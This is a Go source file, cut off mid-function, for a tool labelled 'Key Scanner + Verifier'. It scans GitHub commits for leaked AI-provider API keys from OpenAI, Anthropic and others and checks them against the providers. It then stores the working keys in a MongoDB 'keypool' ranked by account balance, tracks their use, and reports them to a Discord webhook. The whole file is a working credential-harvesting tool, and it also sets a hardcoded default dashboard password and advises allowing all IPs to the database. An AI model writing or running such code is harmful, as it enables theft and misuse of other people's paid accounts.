package main

import (
        "bufio"
        "bytes"
        "context"
        "crypto/hmac"
        "crypto/sha256"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "net/http"
        "os"
        "regexp"
        "sort"
        "strconv"
        "strings"
        "sync"
        "sync/atomic"
        "time"

        tea "github.com/charmbracelet/bubbletea"
        "github.com/charmbracelet/lipgloss"
        "github.com/gorilla/websocket"
        "go.mongodb.org/mongo-driver/v2/bson"
        "go.mongodb.org/mongo-driver/v2/mongo"
        "go.mongodb.org/mongo-driver/v2/mongo/options"
)

// ─── Dashboard State (thread-safe, shared by workers + HTTP server) ─────────

type DashboardState struct {
        mu               sync.RWMutex
        TotalFound       int            `json:"totalFound"`
        TotalScanned     int            `json:"totalScanned"`
        TotalRawHits     int            `json:"totalRawHits"`
        TotalValid       int            `json:"totalValid"`
        TotalInvalid     int            `json:"totalInvalid"`
        TotalWebhookOK   int            `json:"totalWebhookOK"`
        TotalWebhookFail int            `json:"totalWebhookFail"`
        TokenCount       int            `json:"tokenCount"`
        RateLimitRemain  int            `json:"rateLimitRemain"`
        RateLimitLimit   int            `json:"rateLimitLimit"`
        Status           string         `json:"status"`
        ScanWorkers      int            `json:"scanWorkers"`
        VerifyWorkers    int            `json:"verifyWorkers"`
        RecentScans      []ScanFeedItem `json:"recentScans"`
        RecentKeys       []VerifiedMatch `json:"recentKeys"`
        Uptime           time.Time      `json:"-"`
}

type ScanFeedItem struct {
        RepoName  string    `json:"repoName"`
        CommitUrl string    `json:"commitUrl"`
        Time      time.Time `json:"time"`
}

func NewDashboardState() *DashboardState {
        return &DashboardState{
                Status:      "Initializing...",
                Uptime:      time.Now(),
                RecentScans: make([]ScanFeedItem, 0),
                RecentKeys:  make([]VerifiedMatch, 0),
        }
}

func (d *DashboardState) AddScan(repoName, commitUrl string) {
        d.mu.Lock()
        d.TotalScanned++
        d.RecentScans = append(d.RecentScans, ScanFeedItem{
                RepoName:  repoName,
                CommitUrl: commitUrl,
                Time:      time.Now(),
        })
        if len(d.RecentScans) > 100 {
                d.RecentScans = d.RecentScans[len(d.RecentScans)-100:]
        }
        d.mu.Unlock()
}

func (d *DashboardState) AddFound(count int) {
        d.mu.Lock()
        d.TotalFound += count
        d.mu.Unlock()
}

func (d *DashboardState) AddRawHit() {
        d.mu.Lock()
        d.TotalRawHits++
        d.mu.Unlock()
}

func (d *DashboardState) AddVerifiedKey(match VerifiedMatch) {
        d.mu.Lock()
        if match.Valid {
                d.TotalValid++
        } else {
                d.TotalInvalid++
        }
        d.RecentKeys = append(d.RecentKeys, match)
        if len(d.RecentKeys) > 50 {
                d.RecentKeys = d.RecentKeys[len(d.RecentKeys)-50:]
        }
        if match.Valid && match.Balance != "" {
                d.Status = fmt.Sprintf("%s key verified! Balance: %s", match.Provider, match.Balance)
        } else if !match.Valid {
                d.Status = fmt.Sprintf("%s key INVALID (%s)", match.Provider, match.Details)
        }
        d.mu.Unlock()
}

func (d *DashboardState) AddWebhookOK() {
        d.mu.Lock()
        d.TotalWebhookOK++
        d.mu.Unlock()
}

func (d *DashboardState) AddWebhookFail() {
        d.mu.Lock()
        d.TotalWebhookFail++
        d.mu.Unlock()
}

func (d *DashboardState) SetRateLimit(remain, limit int) {
        d.mu.Lock()
        d.RateLimitRemain = remain
        d.RateLimitLimit = limit
        d.mu.Unlock()
}

func (d *DashboardState) SetStatus(status string) {
        d.mu.Lock()
        d.Status = status
        d.mu.Unlock()
}

func (d *DashboardState) GetSnapshot() DashboardState {
        d.mu.RLock()
        snap := *d
        snap.RecentScans = make([]ScanFeedItem, len(d.RecentScans))
        copy(snap.RecentScans, d.RecentScans)
        snap.RecentKeys = make([]VerifiedMatch, len(d.RecentKeys))
        copy(snap.RecentKeys, d.RecentKeys)
        d.mu.RUnlock()
        return snap
}

// ─── WebSocket Hub ─────────────────────────────────────────────────────────

type WSClient struct {
        hub  *WSHub
        conn *websocket.Conn
        send chan []byte
}

type WSHub struct {
        mu      sync.RWMutex
        clients map[*WSClient]struct{}
}

func NewWSHub() *WSHub {
        return &WSHub{clients: make(map[*WSClient]struct{})}
}

func (h *WSHub) Register(client *WSClient) {
        h.mu.Lock()
        h.clients[client] = struct{}{}
        h.mu.Unlock()
}

func (h *WSHub) Unregister(client *WSClient) {
        h.mu.Lock()
        delete(h.clients, client)
        close(client.send)
        h.mu.Unlock()
}

func (h *WSHub) Broadcast(eventType string, data interface{}) {
        msg := map[string]interface{}{
                "type": eventType,
                "data": data,
        }
        msgBytes, err := json.Marshal(msg)
        if err != nil {
                return
        }
        h.mu.RLock()
        for c := range h.clients {
                select {
                case c.send <- msgBytes:
                default:
                        // drop if slow client
                }
        }
        h.mu.RUnlock()
}

func (c *WSClient) writePump() {
        ticker := time.NewTicker(30 * time.Second)
        defer func() {
                ticker.Stop()
                c.conn.Close()
        }()
        for {
                select {
                case msg, ok := <-c.send:
                        if !ok {
                                c.conn.WriteMessage(websocket.CloseMessage, []byte{})
                                return
                        }
                        c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
                        if err := c.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
                                return
                        }
                case <-ticker.C:
                        c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
                        if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
                                return
                        }
                }
        }
}

func (c *WSClient) readPump() {
        defer func() {
                c.hub.Unregister(c)
                c.conn.Close()
        }()
        c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
        c.conn.SetPongHandler(func(string) error {
                c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
                return nil
        })
        for {
                _, _, err := c.conn.ReadMessage()
                if err != nil {
                        break
                }
        }
}

// ─── Key Store (MongoDB persistence) ─────────────────────────────────────

type KeyEntry struct {
        ID          int       `json:"id" bson:"id"`
        Provider    string    `json:"provider" bson:"provider"`
        KeyValue    string    `json:"key" bson:"key"`
        Status      string    `json:"status" bson:"status"` // "valid", "unchecked"
        Balance     string    `json:"balance" bson:"balance"`
        BalanceNum  float64   `json:"balanceNum" bson:"balanceNum"` // numeric for sorting
        Quota       string    `json:"quota" bson:"quota"`
        Tier        string    `json:"tier" bson:"tier"`
        KeyType     string    `json:"keyType" bson:"keyType"`
        Org         string    `json:"org" bson:"org"`
        Models      string    `json:"models" bson:"models"`
        Details     string    `json:"details" bson:"details"`
        Repo        string    `json:"repo" bson:"repo"`
        CommitUrl   string    `json:"commitUrl" bson:"commitUrl"`
        LastChecked time.Time `json:"lastChecked" bson:"lastChecked"`
        LastUsed    time.Time `json:"lastUsed" bson:"lastUsed"`
        UseCount    int       `json:"useCount" bson:"useCount"`
        FoundAt     time.Time `json:"foundAt" bson:"foundAt"`
}

type KeyStore struct {
        mu       sync.RWMutex
        coll     *mongo.Collection
        nextID   atomic.Int64
}

var keyStore *KeyStore

// normalizeMongoURI ensures the connection string has required parameters
func normalizeMongoURI(uri string) string {
        // Add tls=true if not present (required for Atlas)
        if !strings.Contains(uri, "tls=") && !strings.Contains(uri, "ssl=") {
                if strings.Contains(uri, "?") {
                        uri += "&tls=true"
                } else {
                        uri += "?tls=true"
                }
        }
        // Add authSource=admin if not present (required for Atlas)
        if !strings.Contains(uri, "authSource=") {
                uri += "&authSource=admin"
        }
        // Add retryWrites if not present
        if !strings.Contains(uri, "retryWrites=") {
                uri += "&retryWrites=true"
        }
        // Add w=majority if not present
        if !strings.Contains(uri, "w=") {
                uri += "&w=majority"
        }
        return uri
}

func NewKeyStore(mongoURI string) *KeyStore {
        mongoURI = normalizeMongoURI(mongoURI)
        log.Printf("Connecting to MongoDB (URI normalized)...")

        var client *mongo.Client
        var err error

        // Retry connection with exponential backoff
        maxRetries := 5
        for attempt := 1; attempt <= maxRetries; attempt++ {
                ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)

                client, err = mongo.Connect(options.Client().ApplyURI(mongoURI))
                if err != nil {
                        cancel()
                        log.Printf("MongoDB connect error (attempt %d/%d): %v", attempt, maxRetries, err)
                        if attempt < maxRetries {
                                time.Sleep(time.Duration(attempt*5) * time.Second)
                                continue
                        }
                        log.Fatalf("MongoDB connect failed after %d attempts. Error: %v\n"+
                                "HINT: If using MongoDB Atlas, go to Network Access in Atlas Dashboard and add 0.0.0.0/0 to allow all IPs.", maxRetries, err)
                }

                err = client.Ping(ctx, nil)
                cancel()
                if err != nil {
                        log.Printf("MongoDB ping error (attempt %d/%d): %v", attempt, maxRetries, err)
                        if attempt < maxRetries {
                                // Check if it's a TLS error and give specific hint
                                if strings.Contains(err.Error(), "tls:") {
                                        log.Printf("TLS error detected - this usually means your MongoDB Atlas Network Access doesn't allow this server's IP.")
                                        log.Printf("Go to Atlas Dashboard > Network Access > Add IP Address > Add 0.0.0.0/0 (Allow All)")
                                }
                                time.Sleep(time.Duration(attempt*5) * time.Second)
                                // Disconnect and try fresh
                                client.Disconnect(context.Background())
                                continue
                        }
                        log.Fatalf("MongoDB ping failed after %d attempts. Error: %v\n"+
                                "HINT: If using MongoDB Atlas, go to Network Access in Atlas Dashboard and add 0.0.0.0/0 to allow all IPs.", maxRetries, err)
                }

                // Success!
                break
        }

        log.Println("Connected to MongoDB!")

        coll := client.Database("keypool").Collection("keys")

        // Create unique index on key field
        _, idxErr := coll.Indexes().CreateOne(context.Background(), mongo.IndexModel{
                Keys: bson.D{{Key: "key", Value: 1}},
                Options: options.Index().SetUnique(true),
        })
        if idxErr != nil {
                log.Printf("MongoDB index create warning (key): %v", idxErr)
        }

        // Create index on provider + status
        _, idxErr = coll.Indexes().CreateOne(context.Background(), mongo.IndexModel{
                Keys: bson.D{{Key: "provider", Value: 1}, {Key: "status", Value: 1}},
        })
        if idxErr != nil {
                log.Printf("MongoDB index create warning (provider+status): %v", idxErr)
        }

        // Find max ID to continue sequence
        var maxEntry KeyEntry
        opts := options.FindOne().SetSort(bson.D{{Key: "id", Value: -1}})
        err = coll.FindOne(context.Background(), bson.D{}, opts).Decode(&maxEntry)
        ks := &KeyStore{coll: coll}
        if err == nil {
                ks.nextID.Store(int64(maxEntry.ID + 1))
        } else {
                ks.nextID.Store(1)
        }

        return ks
}

func (ks *KeyStore) AddKey(provider, key, repo, commitUrl string) *KeyEntry {
        ks.mu.Lock()
        defer ks.mu.Unlock()

        // Check for duplicate
        var existing KeyEntry
        err := ks.coll.FindOne(context.Background(), bson.D{{Key: "key", Value: key}}).Decode(&existing)
        if err == nil {
                return &existing
        }

        entry := KeyEntry{
                ID:        int(ks.nextID.Add(1) - 1),
                Provider:  provider,
                KeyValue:  key,
                Status:    "unchecked",
                Repo:      repo,
                CommitUrl: commitUrl,
                FoundAt:   time.Now(),
        }

        _, err = ks.coll.InsertOne(context.Background(), entry)
        if err != nil {
                log.Printf("MongoDB insert error: %v", err)
                return nil
        }
        return &entry
}

func parseBalanceNum(balance string) float64 {
        balanceNum := 0.0
        if balance != "" {
                balStr := strings.TrimPrefix(balance, "$")
                parts := strings.Fields(balStr)
                if len(parts) > 0 {
                        fmt.Sscanf(parts[0], "%f", &balanceNum)
                }
        }
        return balanceNum
}

func (ks *KeyStore) UpdateKey(id int, status, balance, quota, tier, keyType, org, models, details string) {
        ks.mu.Lock()
        defer ks.mu.Unlock()

        update := bson.D{
                {Key: "$set", Value: bson.D{
                        {Key: "status", Value: status},
                        {Key: "balance", Value: balance},
                        {Key: "quota", Value: quota},
                        {Key: "tier", Value: tier},
                        {Key: "keyType", Value: keyType},
                        {Key: "org", Value: org},
                        {Key: "models", Value: models},
                        {Key: "details", Value: details},
                        {Key: "lastChecked", Value: time.Now()},
                        {Key: "balanceNum", Value: parseBalanceNum(balance)},
                }},
        }
        _, err := ks.coll.UpdateOne(context.Background(), bson.D{{Key: "id", Value: id}}, update)
        if err != nil {
                log.Printf("MongoDB update error: %v", err)
        }
}

func (ks *KeyStore) GetValidKeys(provider string) []KeyEntry {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        filter := bson.D{{Key: "status", Value: "valid"}}
        if provider != "" {
                filter = append(filter, bson.E{Key: "provider", Value: provider})
        }
        opts := options.Find().SetSort(bson.D{{Key: "balanceNum", Value: -1}})
        cursor, err := ks.coll.Find(context.Background(), filter, opts)
        if err != nil {
                log.Printf("MongoDB find error: %v", err)
                return nil
        }
        var result []KeyEntry
        cursor.All(context.Background(), &result)
        return result
}

func (ks *KeyStore) GetBestKey(provider string) *KeyEntry {
        keys := ks.GetValidKeys(provider)
        if len(keys) == 0 {
                return nil
        }
        return &keys[0]
}

func (ks *KeyStore) MarkUsed(id int) {
        ks.mu.Lock()
        defer ks.mu.Unlock()

        update := bson.D{
                {Key: "$inc", Value: bson.D{{Key: "useCount", Value: 1}}},
                {Key: "$set", Value: bson.D{{Key: "lastUsed", Value: time.Now()}}},
        }
        ks.coll.UpdateOne(context.Background(), bson.D{{Key: "id", Value: id}}, update)
}

func (ks *KeyStore) GetStats() map[string]interface{} {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        ctx := context.Background()
        total, _ := ks.coll.CountDocuments(ctx, bson.D{})
        valid, _ := ks.coll.CountDocuments(ctx, bson.D{{Key: "status", Value: "valid"}})
        unchecked, _ := ks.coll.CountDocuments(ctx, bson.D{{Key: "status", Value: "unchecked"}})

        // Get provider counts via aggregation
        pipeline := []bson.D{
                {{Key: "$group", Value: bson.D{
                        {Key: "_id", Value: "$provider"},
                        {Key: "total", Value: bson.D{{Key: "$sum", Value: 1}}},
                        {Key: "valid", Value: bson.D{{Key: "$sum", Value: bson.D{{Key: "$cond", Value: bson.D{{Key: "if", Value: bson.D{{Key: "$eq", Value: []string{"$status", "valid"}}}}, {Key: "then", Value: 1}, {Key: "else", Value: 0}}}}}}},
                }}},
        }
        cursor, err := ks.coll.Aggregate(ctx, pipeline)
        if err != nil {
                return map[string]interface{}{"total": total, "valid": valid, "invalid": 0, "unchecked": unchecked, "providers": map[string]map[string]int{}}
        }
        var results []struct {
                Provider string `bson:"_id"`
                Total    int    `bson:"total"`
                Valid    int    `bson:"valid"`
        }
        cursor.All(ctx, &results)

        providerCounts := make(map[string]map[string]int)
        for _, r := range results {
                providerCounts[r.Provider] = map[string]int{"total": r.Total, "valid": r.Valid, "invalid": r.Total - r.Valid}
        }

        return map[string]interface{}{
                "total":     int(total),
                "valid":     int(valid),
                "invalid":   0,
                "unchecked": int(unchecked),
                "providers": providerCounts,
        }
}

func (ks *KeyStore) GetProviderKeys(provider string) []KeyEntry {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        opts := options.Find().SetSort(bson.D{{Key: "balanceNum", Value: -1}})
        cursor, err := ks.coll.Find(context.Background(), bson.D{{Key: "provider", Value: provider}}, opts)
        if err != nil {
                return nil
        }
        var result []KeyEntry
        cursor.All(context.Background(), &result)
        return result
}

func (ks *KeyStore) GetAllProviders() []string {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        pipeline := []bson.D{
                {{Key: "$group", Value: bson.D{{Key: "_id", Value: "$provider"}}}},
        }
        cursor, err := ks.coll.Aggregate(context.Background(), pipeline)
        if err != nil {
                return nil
        }
        var results []struct {
                Provider string `bson:"_id"`
        }
        cursor.All(context.Background(), &results)
        var providers []string
        for _, r := range results {
                providers = append(providers, r.Provider)
        }
        // Sort providers by priority
        sort.Slice(providers, func(i, j int) bool {
                pi, oki := providerPriority[providers[i]]
                pj, okj := providerPriority[providers[j]]
                if !oki {
                        pi = 999
                }
                if !okj {
                        pj = 999
                }
                return pi < pj
        })
        return providers
}

func (ks *KeyStore) DeleteKey(id int) {
        ks.mu.Lock()
        defer ks.mu.Unlock()
        _, err := ks.coll.DeleteOne(context.Background(), bson.D{{Key: "id", Value: id}})
        if err != nil {
                log.Printf("MongoDB delete error: %v", err)
        }
}

func (ks *KeyStore) GetKeyByID(id int) *KeyEntry {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        var entry KeyEntry
        err := ks.coll.FindOne(context.Background(), bson.D{{Key: "id", Value: id}}).Decode(&entry)
        if err != nil {
                return nil
        }
        return &entry
}

func (ks *KeyStore) GetKeyByValue(key string) *KeyEntry {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        var entry KeyEntry
        err := ks.coll.FindOne(context.Background(), bson.D{{Key: "key", Value: key}}).Decode(&entry)
        if err != nil {
                return nil
        }
        return &entry
}

func (ks *KeyStore) GetAllKeys() []KeyEntry {
        ks.mu.RLock()
        defer ks.mu.RUnlock()

        opts := options.Find().SetSort(bson.D{
                {Key: "provider", Value: 1},
                {Key: "balanceNum", Value: -1},
        })
        cursor, err := ks.coll.Find(context.Background(), bson.D{}, opts)
        if err != nil {
                return nil
        }
        var result []KeyEntry
        cursor.All(context.Background(), &result)

        // Sort by provider priority: openai first, anthropic second, then alphabetical
        result = sortKeysByPriority(result)
        return result
}

// providerPriority defines the display order for providers
var providerPriority = map[string]int{
        "openai":      1,
        "anthropic":   2,
        "deepseek":    3,
        "groq":        4,
        "mistral":     5,
        "openrouter":  6,
        "xai":         7,
        "together":    8,
        "fireworks":   9,
        "perplexity":  10,
        "huggingface": 11,
        "replicate":   12,
        "cohere":      13,
        "elevenlabs":  14,
        "ai21":        15,
}

func sortKeysByPriority(keys []KeyEntry) []KeyEntry {
        sort.Slice(keys, func(i, j int) bool {
                pi, oki := providerPriority[keys[i].Provider]
                pj, okj := providerPriority[keys[j].Provider]
                if !oki {
                        pi = 999
                }
                if !okj {
                        pj = 999
                }
                if pi != pj {
                        return pi < pj
                }
                // Same provider: sort by balance descending
                return keys[i].BalanceNum > keys[j].BalanceNum
        })
        return keys
}

// ─── Config ──────────────────────────────────────────────────────────────────

type Config struct {
        GitHubToken       string
        DiscordWebhook    string
        Signatures        map[string]string
        EnableVerify      bool
        VerifyWorkers     int
        VerifyTimeout     int
        DashboardPassword string
        ProxyEnabled      bool
        AutoValidate      bool
        ValidateInterval  string
        MongoDBURI        string
}

// ─── App Settings ──────────────────────────────────────────────────────────

type AppSettings struct {
        AutoValidate      bool   `json:"autoValidate"`
        ValidateInterval  string `json:"validateInterval"`
        DiscordEnabled    bool   `json:"discordEnabled"`
        ProxyEnabled      bool   `json:"proxyEnabled"`
        DashboardPassword string `json:"dashboardPassword"`
}

var appSettings AppSettings

func defaultSettings(cfg Config) AppSettings {
        return AppSettings{
                AutoValidate:      cfg.AutoValidate,
                ValidateInterval:  cfg.ValidateInterval,
                DiscordEnabled:    cfg.DiscordWebhook != "",
                ProxyEnabled:      cfg.ProxyEnabled,
                DashboardPassword: cfg.DashboardPassword,
        }
}

// ─── Token Pool (round-robin with rate-limit awareness) ─────────────────────

type TokenPool struct {
        tokens []string
        index  uint64 // atomically incremented via sync/atomic
}

func NewTokenPool(tokenStr string) *TokenPool {
        // Split by comma or newline, trim spaces, skip empties
        raw := strings.ReplaceAll(tokenStr, "\n", ",")
        parts := strings.Split(raw, ",")
        var tokens []string
        for _, p := range parts {
                t := strings.TrimSpace(p)
                if t != "" {
                        tokens = append(tokens, t)
                }
        }
        if len(tokens) == 0 {
                tokens = []string{""}
        }
        return &TokenPool{tokens: tokens}
}

func (tp *TokenPool) Next() string {
        i := atomic.AddUint64(&tp.index, 1)
        return tp.tokens[i%uint64(len(tp.tokens))]
}

func (tp *TokenPool) Count() int {
        return len(tp.tokens)
}

// ─── Regex Rules ─────────────────────────────────────────────────────────────

type Rule struct {
        Name      string
        Regex     *regexp.Regexp
        CanVerify bool
        Provider  string
}

// ─── Scan Job ────────────────────────────────────────────────────────────────

type ScanJob struct {
        RepoName  string
        CommitUrl string
}

// ─── Match (raw regex hit, pre-verification) ────────────────────────────────

type RawMatch struct {
        Rule      string
        Provider  string
        Text      string
        Repo      string
        CommitUrl string
        CanVerify bool
}

// ─── Verified Match (after provider API check) ──────────────────────────────

type VerifiedMatch struct {
        Provider  string
        Key       string
        Redacted  string
        Valid     bool   // true = verified working, false = invalid/dead
        Status    string
        Details   string
        Balance   string
        Quota     string
        Tier      string
        KeyType   string // e.g. "Project", "Legacy", "Live", "Test", "Bot"
        Org       string // e.g. org name for OpenAI, team for Slack
        Models    string // e.g. "47 models accessible"
        Repo      string
        CommitUrl string
}

// ─── Discord Webhook Payload ────────────────────────────────────────────────

type DiscordEmbedField struct {
        Name   string `json:"name"`
        Value  string `json:"value"`
        Inline bool   `json:"inline"`
}

type DiscordEmbed struct {
        Title       string              `json:"title"`
        Description string              `json:"description"`
        Color       int                 `json:"color"`
        Fields      []DiscordEmbedField `json:"fields"`
        Footer      *DiscordEmbedFooter `json:"footer,omitempty"`
}

type DiscordEmbedFooter struct {
        Text string `json:"text"`
}

type DiscordPayload struct {
        Embeds []DiscordEmbed `json:"embeds"`
}

// ─── TUI Messages ────────────────────────────────────────────────────────────

type MsgFetchedCommits struct{ Count int }
type MsgScanStarted struct{ CommitUrl string }
type MsgScanCompleted struct{ CommitUrl string }
type MsgRawMatchFound struct {
        Rule      string
        Provider  string
        Text      string
        Repo      string
        CommitUrl string
        CanVerify bool
}
type MsgVerifiedMatch struct {
        Provider  string
        Key       string
        Redacted  string
        Valid     bool
        Status    string
        Details   string
        Balance   string
        Quota     string
        Tier      string
        KeyType   string
        Org       string
        Models    string
        Repo      string
        CommitUrl string
}
type MsgRateLimit struct {
        Remaining int
        Limit     int
}
type MsgStatusUpdate struct{ Status string }
type MsgWebhookResult struct {
        Success  bool
        Provider string
        Err      string
}

// ─── TUI Model ──────────────────────────────────────────────────────────────

type tuiModel struct {
        totalFound       int
        totalScanned     int
        totalRawHits     int
        totalValid       int
        totalInvalid     int
        totalWebhookOK   int
        totalWebhookFail int
        tokenCount       int
        recentKeys       []MsgVerifiedMatch
        status           string
        rateLimitLimit   int
        rateLimitRemain  int
        activeWorkers    int
}

func (m tuiModel) Init() tea.Cmd { return nil }

func (m tuiModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
        switch msg := msg.(type) {
        case tea.KeyMsg:
                switch msg.String() {
                case "q", "ctrl+c":
                        return m, tea.Quit
                }
        case MsgFetchedCommits:
                m.totalFound += msg.Count
        case MsgScanStarted:
                m.status = fmt.Sprintf("Scanning commit: %s", msg.CommitUrl)
        case MsgScanCompleted:
                m.totalScanned++
        case MsgRawMatchFound:
                m.totalRawHits++
        case MsgVerifiedMatch:
                if msg.Valid {
                        m.totalValid++
                } else {
                        m.totalInvalid++
                }
                m.recentKeys = append(m.recentKeys, msg)
                if len(m.recentKeys) > 15 {
                        m.recentKeys = m.recentKeys[len(m.recentKeys)-15:]
                }
                if msg.Valid && msg.Balance != "" {
                        m.status = fmt.Sprintf("💰 %s key verified! Balance: %s", msg.Provider, msg.Balance)
                } else if !msg.Valid {
                        m.status = fmt.Sprintf("❌ %s key INVALID (%s)", msg.Provider, msg.Details)
                }
        case MsgRateLimit:
                m.rateLimitRemain = msg.Remaining
                m.rateLimitLimit = msg.Limit
        case MsgStatusUpdate:
                m.status = msg.Status
        case MsgWebhookResult:
                if msg.Success {
                        m.totalWebhookOK++
                        m.status = fmt.Sprintf("Webhook sent: %s key", msg.Provider)
                } else {
                        m.totalWebhookFail++
                        m.status = fmt.Sprintf("Webhook FAILED: %s (%s)", msg.Provider, msg.Err)
                }
        }
        return m, nil
}

func (m tuiModel) View() string {
        var s string

        s += titleStyle.Render("🔑 Key Scanner + Verifier") + "\n\n"

        var stats string
        stats += fmt.Sprintf("Status: %s\n", accentStyle.Render(m.status))
        stats += fmt.Sprintf("Found: %d commits\n", m.totalFound)
        stats += fmt.Sprintf("Scanned: %d commits\n", m.totalScanned)
        stats += fmt.Sprintf("Raw Matches: %d\n", m.totalRawHits)
        stats += fmt.Sprintf("Valid Keys: %s", greenStyle.Render(fmt.Sprintf("%d", m.totalValid)))
        if m.totalInvalid > 0 {
                stats += fmt.Sprintf(" | Invalid: %s", redStyle.Render(fmt.Sprintf("%d", m.totalInvalid)))
        }
        stats += "\n"
        stats += fmt.Sprintf("Webhook Sent: %s", greenStyle.Render(fmt.Sprintf("%d", m.totalWebhookOK)))
        if m.totalWebhookFail > 0 {
                stats += fmt.Sprintf(" | Failed: %s", redStyle.Render(fmt.Sprintf("%d", m.totalWebhookFail)))
        }
        stats += "\n"
        stats += fmt.Sprintf("Workers: %d active\n", m.activeWorkers)
        stats += fmt.Sprintf("GitHub Tokens: %s\n", greenStyle.Render(fmt.Sprintf("%d", m.tokenCount)))

        rlStr := "N/A"
        if m.rateLimitLimit > 0 {
                rlStr = fmt.Sprintf("%d/%d", m.rateLimitRemain, m.rateLimitLimit)
                if m.rateLimitRemain < 10 {
                        rlStr = redStyle.Render(rlStr)
                } else {
                        rlStr = greenStyle.Render(rlStr)
                }
        }
        stats += fmt.Sprintf("Rate Limit:   %s\n", rlStr)

        s += borderStyle.Render(stats) + "\n"

        s += accentStyle.Render("🔑 Recent Keys:") + "\n"
        if len(m.recentKeys) == 0 {
                s += "  No keys found yet.\n"
        } else {
                for _, hit := range m.recentKeys {
                        if hit.Valid {
                                s += fmt.Sprintf("  [%s] %s in %s\n", greenStyle.Render("VALID"), accentStyle.Render(hit.Provider), hit.Repo)
                                s += fmt.Sprintf("  ↳ Key: %s\n", hit.Key)
                                if hit.KeyType != "" {
                                        s += fmt.Sprintf("  ↳ Type: %s\n", hit.KeyType)
                                }
                                if hit.Models != "" {
                                        s += fmt.Sprintf("  ↳ Models: %s\n", hit.Models)
                                }
                                if hit.Org != "" {
                                        s += fmt.Sprintf("  ↳ Org: %s\n", hit.Org)
                                }
                                if hit.Balance != "" {
                                        s += fmt.Sprintf("  ↳ 💰 Balance: %s\n", greenStyle.Render(hit.Balance))
                                }
                                if hit.Quota != "" {
                                        s += fmt.Sprintf("  ↳ Quota: %s\n", hit.Quota)
                                }
                                if hit.Tier != "" {
                                        s += fmt.Sprintf("  ↳ Tier: %s\n", hit.Tier)
                                }
                        } else {
                                s += fmt.Sprintf("  [%s] %s in %s\n", redStyle.Render("INVALID"), accentStyle.Render(hit.Provider), hit.Repo)
                                s += fmt.Sprintf("  ↳ Key: %s\n", hit.Key)
                                s += fmt.Sprintf("  ↳ Reason: %s\n", redStyle.Render(hit.Details))
                        }
                        s += fmt.Sprintf("  ↳ Commit: %s\n\n", hit.CommitUrl)
                }
        }

        s += "\n" + helpStyle.Render("Press 'q' or 'Ctrl+C' to exit.") + "\n"
        return s
}

// ─── Styles ──────────────────────────────────────────────────────────────────

var (
        titleStyle = lipgloss.NewStyle().
                        Bold(true).
                        Foreground(lipgloss.Color("#FAFAFA")).
                        Background(lipgloss.Color("#7D56F4")).
                        Padding(0, 1).
                        MarginBottom(1)
        accentStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#7D56F4")).
                        Bold(true)
        greenStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#04B575")).
                        Bold(true)
        redStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#FF5555")).
                        Bold(true)
        borderStyle = lipgloss.NewStyle().
                        Border(lipgloss.RoundedBorder()).
                        BorderForeground(lipgloss.Color("#874BFD")).
                        Padding(1).
                        MarginBottom(1).
                        Width(70)
        helpStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#6272A4")).
                        Italic(true)
)

// ─── Config Init ─────────────────────────────────────────────────────────────

func loadEnvFile(path string) {
        data, err := os.ReadFile(path)
        if err != nil {
                return
        }
        for _, line := range strings.Split(string(data), "\n") {
                line = strings.TrimSpace(line)
                if line == "" || strings.HasPrefix(line, "#") {
                        continue
                }
                parts := strings.SplitN(line, "=", 2)
                if len(parts) != 2 {
                        continue
                }
                key := strings.TrimSpace(parts[0])
                value := strings.TrimSpace(parts[1])
                // Remove surrounding quotes
                if (strings.HasPrefix(value, "\"") && strings.HasSuffix(value, "\"")) ||
                        (strings.HasPrefix(value, "'") && strings.HasSuffix(value, "'")) {
                        value = value[1 : len(value)-1]
                }
                // Only set if not already in environment (env vars take precedence)
                if os.Getenv(key) == "" {
                        os.Setenv(key, value)
                }
        }
}

func initConfig(cfg *Config) error {
        // Load .env file (env vars already set take precedence)
        loadEnvFile(".env")

        // Apply defaults and read from env
        cfg.GitHubToken = getEnv("GITHUB_TOKEN", "")
        cfg.DiscordWebhook = getEnv("DISCORD_WEBHOOK", "")
        cfg.EnableVerify = getEnvBool("ENABLE_VERIFY", true)
        cfg.VerifyWorkers = getEnvInt("VERIFY_WORKERS", 20)
        cfg.VerifyTimeout = getEnvInt("VERIFY_TIMEOUT", 15)
        cfg.DashboardPassword = getEnv("DASHBOARD_PASSWORD", "overwrite67")
        cfg.ProxyEnabled = getEnvBool("PROXY_ENABLED", true)
        cfg.AutoValidate = getEnvBool("AUTO_VALIDATE", true)
        cfg.ValidateInterval = getEnv("VALIDATE_INTERVAL", "24h")
        cfg.MongoDBURI = getEnv("MONGODB_URI", "")
        cfg.Signatures = nil // No custom signatures via env

        log.Println("Loaded config:")
        log.Printf("  GitHub Token: %s... (%d tokens in pool)", redact(cfg.GitHubToken, 8), NewTokenPool(cfg.GitHubToken).Count())
        log.Printf("  Discord Webhook: %v", cfg.DiscordWebhook != "")
        log.Printf("  Enable Verify: %v", cfg.EnableVerify)
        log.Printf("  Verify Workers: %d", cfg.VerifyWorkers)
        log.Printf("  Proxy Enabled: %v", cfg.ProxyEnabled)
        log.Printf("  Auto Validate: %v", cfg.AutoValidate)
        log.Printf("  Validate Interval: %s", cfg.ValidateInterval)
        log.Printf("  MongoDB: %v", cfg.MongoDBURI != "")
        return nil
}

func getEnv(key, fallback string) string {
        if v := os.Getenv(key); v != "" {
                return v
        }
        return fallback
}

func getEnvBool(key string, fallback bool) bool {
        v := os.Getenv(key)
        if v == "" {
                return fallback
        }
        return v == "true" || v == "1"
}

func getEnvInt(key string, fallback int) int {
        v := os.Getenv(key)
        if v == "" {
                return fallback
        }
